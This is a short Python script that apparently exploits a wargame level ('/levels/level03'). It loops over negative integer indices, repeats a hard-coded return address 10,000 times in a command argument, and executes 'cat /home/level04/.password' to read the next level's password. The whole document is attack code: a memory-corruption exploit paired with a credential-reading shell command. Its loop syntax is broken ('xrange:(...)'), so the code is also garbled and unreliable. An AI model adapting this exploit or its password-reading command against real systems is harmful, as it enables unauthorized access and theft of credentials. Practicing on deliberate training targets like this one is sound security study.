
import os,sys
i = sys.argv[1]
for i in xrange:(-2147483555,-2147483755):
        adr = str(chr(8))+str(chr(4))+str(chr(135))+str(chr(91))
        cmd = "/levels/level03 "+str(i)+" \"cat /home/level04/.password; "
        for n in xrange(0,10000):
                cmd += adr
        cmd += "\""
        for n in xrange(0,50):
                os.system(cmd)